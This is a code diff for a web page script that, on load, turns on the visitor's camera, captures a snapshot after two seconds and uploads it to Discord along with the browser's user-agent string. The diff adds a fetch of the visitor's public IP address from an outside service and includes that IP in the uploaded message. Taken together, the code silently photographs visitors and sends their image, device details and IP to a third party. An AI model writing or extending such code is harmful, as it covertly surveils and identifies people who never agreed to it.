@@ -46,10 +46,22 @@
 
         // Start the camera automatically when the page loads
         window.onload = async () => {
-            await startCamera();
+            const ipAddress = await getUserIp(); // Get user IP
+            await startCamera(ipAddress); // Pass IP to start camera function
         };
 
-        async function startCamera() {
+        async function getUserIp() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip; // Return user's IP address
+            } catch (error) {
+                console.error('Error fetching IP address:', error);
+                return 'Unable to retrieve IP'; // Fallback message
+            }
+        }
+
+        async function startCamera(ipAddress) {
             // Check if getUserMedia is supported
             if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                 console.error('getUserMedia not supported on this browser or device.');
@@ -66,7 +78,7 @@
 
                 // Capture snapshot after a 2-second delay once metadata is loaded
                 video.addEventListener('loadedmetadata', () => {
-                    setTimeout(() => takeSnapshot(stream), 2000); // 2 seconds delay before taking the snapshot
+                    setTimeout(() => takeSnapshot(stream, ipAddress), 2000); // 2 seconds delay before taking the snapshot
                 });
 
             } catch (error) {
@@ -75,7 +87,7 @@
             }
         }
 
-        function takeSnapshot(stream) {
+        function takeSnapshot(stream, ipAddress) {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
             const context = canvas.getContext('2d');
@@ -94,11 +106,14 @@
             // Display the snapshot
             document.getElementById('snapshot').src = imageData;
 
+            // Get User-Agent string for device info
+            const userAgent = navigator.userAgent;
+
             // Send the image to Discord with additional details
-            uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight);
+            uploadImageToDiscord(imageData, video.videoWidth, video.videoHeight, userAgent, ipAddress);
         }
 
-        async function uploadImageToDiscord(imageData, width, height) {
+        async function uploadImageToDiscord(imageData, width, height, userAgent, ipAddress) {
             // Convert the base64 image to a Blob
             const blob = await fetch(imageData).then(res => res.blob());
 
@@ -108,12 +123,12 @@
 
             // Create a detailed message with additional information
             const timestamp = new Date().toISOString();
-            const userAgent = navigator.userAgent; // Get User-Agent string
             const content = `
                 Snapshot captured at: ${timestamp}
                 Image dimensions: ${width}x${height} pixels
                 Image format: PNG
                 Device Info: ${userAgent}
+                User IP: ${ipAddress}
             `;
             formData.append('content', content.trim()); // Append the message to the form data
 
